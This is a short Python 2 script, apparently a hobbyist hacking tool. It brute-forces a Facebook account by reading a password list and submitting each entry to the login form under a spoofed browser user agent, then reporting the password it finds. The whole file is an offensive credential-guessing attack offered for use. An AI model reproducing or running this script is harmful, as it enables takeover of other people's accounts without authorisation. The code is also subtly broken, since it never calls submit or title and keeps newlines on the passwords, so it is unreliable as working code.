from mechanize import Browser
email=raw_input("Email or Phone : ")
passw=raw_input("passlist path : ")
pw=open(passw,"r")
b=Browser()
b.set_handle_robots(False)
b.addheaders=[("User-agent","Mozilla/3.0")]
for x in pw:
	b.open("https://en-gb.facebook.com/login/")
	b.select_form(nr=0)
	b.form["email"]=email
	b.form["pass"]=x
	b.submit 
	if b.title =="Facebook":
		print "password found : "+x
		break;
	else:
		print "trying : "+x
		
	

